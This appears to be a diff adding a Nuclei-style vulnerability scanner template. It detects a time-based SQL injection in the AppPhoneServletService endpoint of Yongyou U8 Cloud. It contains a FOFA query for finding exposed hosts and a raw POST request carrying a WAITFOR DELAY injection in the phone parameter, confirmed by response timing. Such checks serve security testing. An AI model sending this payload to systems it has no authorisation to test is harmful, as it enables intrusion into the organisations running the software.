@@ -1,0 +1,39 @@
+id: poc-yaml-yongyou-u8-cloud-appphoneservletservice-sqli
+info:
+  name: Yongyou U8 Cloud AppPhoneServletService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: "用友U8cloud"
+    fofa: "app=\"用友-U8-Cloud\""
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 1}}'
+
+http:
+  - raw:
+      - |
+        POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        accountCode: U8cloud
+
+        module=sm&method=getUserInfoByPhone&phone=1';WAITFOR+DELAY+'0:0:{{t1}}'--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":false'
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
